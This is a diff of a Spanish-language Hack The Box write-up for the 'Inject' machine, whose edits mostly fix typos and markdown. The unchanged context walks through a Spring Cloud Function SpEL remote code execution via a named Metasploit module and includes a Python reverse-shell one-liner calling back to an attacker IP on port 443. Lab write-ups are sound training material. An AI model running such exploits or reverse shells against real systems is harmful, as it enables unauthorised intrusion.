@@ -13,7 +13,7 @@ image:
 # Imortante
 Está máquina esta en Release Arena(actualmemte **Open Beta Season**), por lo que la IP es de una instancia privada.
 
-Les explicaré cómo compremeter la máquina [Inject](https://app.hackthebox.com/machines/533) de hackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de tipo **Directory Transversal*, usando dicha vulnerabilidad veremos una version vulnerable de Spring que cuenta con una vulnerabilidad de tipo **RCE**. Para migrar de usuario nos aprovecharemos de una contrasena filtrada. Para escalar nuestros privilegios usaremos playbook.
+Les explicaré cómo compremeter la máquina [Inject](https://app.hackthebox.com/machines/533) de hackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de tipo **Directory Transversal**, usando dicha vulnerabilidad veremos una version vulnerable de Spring que cuenta con una vulnerabilidad de tipo **RCE**. Para migrar de usuario nos aprovecharemos de una contrasena filtrada. Para escalar nuestros privilegios usaremos playbook.
 
 ## Identificando el O.S
 Enviando trazas **ICMP(Internet Control Message Protocol)** y usando el **TTL(Time to Live)** podemos ver identificar el OS.
@@ -58,7 +58,7 @@ Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
 Corre por el puerto 8080, ahora podemos ver la web correctamente.
 
 ![Web Error]({{ 'assets/img/commons/inject-writeup/web.png' | relative_url }}){: .center-image }
-_Web Error
+_Web Error_
 
 ## Detectando posibles métodos de intrución
 Vemos un Login, lo cual podemos crear una cuanta y probar cosas pero no existe dicho archiv, y vemos un **Sing Up** existe, podemos probar injeciones SQL y NoSQL pero nos redirige a una página que nos induca que esta en construcción.
@@ -225,7 +225,7 @@ Nos abrimos metasploit
 ```
 msfconsole
 ```
-Usando de apoyo este [foro](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/spring_cloud_function_spel_injection) nos guiaremos.Una vez dentro de metasploit  haremos lo siguiente.
+Usando de apoyo este [foro](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/spring_cloud_function_spel_injection) nos guiaremos. Una vez dentro de metasploit  haremos lo siguiente.
 
 ```
 [msf](Jobs:0 Agents:0) >> use exploit/multi/http/spring_cloud_function_spel_injection
@@ -250,10 +250,10 @@ Channel 1 created.
 whoami && id
 frank
 uid=1000(frank) gid=1000(frank) groups=1000(frank)
-
+```
 Ahora para mayor comodidad nos pasaremos esa shell mediante reverse shell, comprobamos si esta python3 y efectivamente esta instalado.
 
-```
+```python
 export RHOST="10.10.14.170";export RPORT=443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
 ```
 En nuestra máquina nos ponemos en escucha por el puerto 443 y nos debe llegar.
@@ -264,9 +264,9 @@ listening on [any] 443 ...
 connect to [10.10.14.170] from (UNKNOWN) [10.129.178.241] 48474
 frank@inject:/$
 ```
-Aplicamos tratamiento a la [TTY](https://h4ckerlite.github.io/posts/tty/)
+Aplicamos tratamiento a la [TTY](https://h4ckerlite.github.io/posts/tty/).
 
-## Migraciñon de usuario
+## Migración de usuario
 En la carpeta personal del usuario listamos carpetas escondidad
 
 ```bash
